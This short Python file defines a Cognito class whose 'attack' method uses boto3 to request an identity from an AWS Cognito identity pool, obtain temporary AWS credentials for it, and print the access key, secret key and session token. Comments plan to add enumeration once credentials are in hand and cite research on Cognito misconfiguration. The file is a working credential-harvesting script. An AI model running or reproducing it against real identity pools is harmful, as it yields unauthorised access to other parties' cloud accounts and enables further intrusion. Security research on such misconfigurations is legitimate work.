# To add authenticated identity checks
# also add enumeration after accessing credentials
# Add code for getting region and cognito endpoint
# Link - https://andresriancho.com/internet-scale-analysis-of-aws-cognito-security/
import boto3

class Cognito:
    pass

    def attack(self, ce, region):
        client = boto3.client('cognito-identity', region_name=region)
        try:
            _id = client.get_id(IdentityPoolId=region + ':' + ce)
        except client.exceptions.NotAuthorizedException as e:
            fail_message = "Bla Bla: {}".format(e)
            print(fail_message)
            return fail_message
        _id = _id['IdentityId']

        credentials = client.get_credentials_for_identity(IdentityId=_id)

        access_key = credentials['Credentials']['AccessKeyId']
        secret_key = credentials['Credentials']['SecretKey']
        session_token = credentials['Credentials']['SessionToken']
        identity_id = credentials['IdentityId']

        print("Access key - ", access_key)
        print("Secret key -", secret_key)
        print("Session token -", session_token)
